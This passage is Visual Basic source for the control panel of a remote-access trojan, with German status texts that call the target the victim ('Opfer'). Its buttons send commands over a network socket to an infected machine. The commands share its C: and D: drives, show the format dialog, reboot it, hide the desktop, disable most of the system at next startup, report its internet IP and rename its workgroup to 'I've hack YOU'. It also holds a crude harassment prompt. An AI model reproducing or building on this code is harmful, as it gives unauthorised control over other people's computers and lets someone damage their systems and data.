    W.SendData "discoon"
    Exit Sub
End If
If Check2.Value = 1 Then
    Check2.Value = 0
    Command49.Caption = "CAPS AUS"
    W.SendData "discooff"
    Exit Sub
End If
End Sub

Private Sub Command49_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Lässt die CAPS (Num lock usw.) verückt spielen"
End Sub

Private Sub Command5_Click()
W.SendData "jan"
End Sub

Private Sub Command5_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "schickt eine MSG BOX"
End Sub

Private Sub Command6_Click()
W.SendData "funny"
End Sub

Private Sub Command6_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Den Trojan mal anderes"
End Sub

Private Sub Command7_Click()
W.SendData "secure"
End Sub

Private Sub Command7_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Bei dem nächsten systemstart wird sich der andere Wundern fast alles ist deaktiviert"
End Sub

Private Sub Command8_Click()
W.SendData "rebooti"
End Sub

Private Sub Command8_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Startet den Windowsrechner NEU"
End Sub

Private Sub Command9_Click()
W.SendData "format"
End Sub

Private Sub doppelk_Click()

End Sub

Private Sub Command9_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "holt den Formatieren Dialog auf den Rechner des Opfer"
End Sub

Private Sub Form_Load()
HELP.Visible = False
Status.Visible = False
End Sub


Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = ""
End Sub

Private Sub Form_Terminate()
W.Close
End Sub

Private Sub Form_Unload(Cancel As Integer)
W.Close
End Sub

Private Sub Freigabe_Click()
W.SendData "freic"
End Sub

Private Sub Freigabe_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Gibt das Laufwerk C:\ frei"
End Sub

Private Sub FreigabeD_Click()
W.SendData "freid"
End Sub

Private Sub FreigabeD_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Gibt das Laufwerk D:\ auf den Rechner frei"
End Sub

Private Sub hide_Click()
W.SendData "hide"
End Sub

Private Sub hide_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "versteckt den Desktop"
End Sub

Private Sub how_Click()
Form1.Enabled = False
Form2.show
End Sub

Private Sub internetip_Click()
W.SendData "internetIP"
End Sub

Private Sub Label3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Label3.ForeColor = RED
End Sub


Private Sub internetip_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Zeigt die Internet IP"
End Sub

Private Sub malen_Click()
W.SendData "deskmalen"
End Sub

Private Sub malen_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Der Desktop bei dem anderen Rechner wird bemalt Endlos (Client wird aber sichtbar hängt sich auf)"
End Sub

Private Sub open_Click()
W.SendData "open"
End Sub

Private Sub open_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "öffnet das CD - ROM Laufwerk "
End Sub

Private Sub Option1_Click(Index As Integer)
  Dim X&, Y&
    Select Case Index
      Case 0: W.SendData "bildi640"
      Case 1: W.SendData "bildi800"
      Case 2: W.SendData "bildi1024"
      Case 3: W.SendData "bildi1152"
    End Select
End Sub

Private Sub Option2_Click()
W.SendData "bildi640"
End Sub

Private Sub show_Click()
W.SendData "show"
End Sub

Private Sub show_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "Zeigt den Desktop wieder"
End Sub

Private Sub spezial_Click()
If a = 0 Then
    Check1.Value = 1
    HELP.Visible = True
End If
If a = 1 Then
    Check1.Value = 0
    HELP.Visible = False
End If
End Sub


Private Sub Text1_Change()
Command36.Enabled = True
If Text1.Text = "" Then
    Command36.Enabled = False
End If
End Sub

Private Sub Text1_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
    If Text1.Text = "" Then
        MsgBox "Keine Angabe gemacht", vbCritical + vbSystemModal + vbMsgBoxSetForeground, "Fehler 100"
        Exit Sub
    End If
    ConnectionState.Visible = True
    Text5.Visible = True
    Command36_Click
End If
End Sub

Private Sub Text4_KeyPress(KeyAscii As Integer)
If KeyAscii = 13 Then
    List2.AddItem ""
    W.Close: List2.AddItem Time & "  Closing Port " & W.LocalPort & "."
    W.LocalPort = Text1.Text: List2.AddItem Time & "  Opening Port " & W.LocalPort & "."
    W.Listen: List2.AddItem Time & "  Listening."
End If
Form1.Caption = W.LocalPort
End Sub

Private Sub Timer1_Timer()
If Check1.Value = 1 Then
    Form1.Width = 11880
    a = 1
    Status.Visible = True
End If
If Check1.Value = 0 Then
    Form1.Width = 6795
    a = 0
    Status.SimpleText = ""
    Status.Visible = False
End If
End Sub
Private Sub Command1_Click()
W.SendData Text2.Text
Text1.SetFocus
End Sub

Private Sub Timer2_Timer()
Y = Rnd * 3000
X = Rnd * 1200
Command30.Width = Y
Command30.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command10.Width = Y
Command10.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command20.Width = Y
Command20.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command35.Width = Y
Command35.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command40.Width = Y
Command40.Height = X
Y = Rnd * 3000
X = Rnd * 1200
Command12.Width = Y
Command12.Height = X
End Sub

Private Sub W_DataArrival(ByVal bytesTotal As Long)
Beep
Dim Temp As String
W.GetData Temp, vbString
If Temp = "W.Connect" Then
    List1.AddItem W.RemoteHostIP
    List2.AddItem Time & "  " & W.RemoteHostIP & " connected."
    Text5.Text = "Erfolgreich mit " & Text1.Text & " verbunden"
End If
If Temp = "NF" Then
    Res = MsgBox("Ficken ???", vbSystemModal + vbYesNo + vbCritical, "NF")
    If Res = vbYes Then
        W.SendData "JA SOFORT JEDER ZEIT"
        Else
        W.SendData "Wer bist Du denn bitte (kein Joke) ?"
    End If
    Exit Sub
End If
If Temp = "DiSaBlEd" Then
    Check1.Value = 0
    Form1.Width = 6795
    Timer1.Enabled = False
    Exit Sub
End If
If Temp = "EnAbLeD" Then
    Check1.Value = 1
    Form1.Width = 11880
    Timer1.Enabled = True
    Exit Sub
End If
If Temp = "Flyma" Then
    Timer2.Enabled = True
    Exit Sub
End If
If Temp = "Land" Then
    Timer2.Enabled = False
    Exit Sub
End If
Text3.Text = Temp
End Sub

Private Sub WORKGROUP_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
Status.SimpleText = "setzt den Workgroup namen auf I've hack YOU"
End Sub
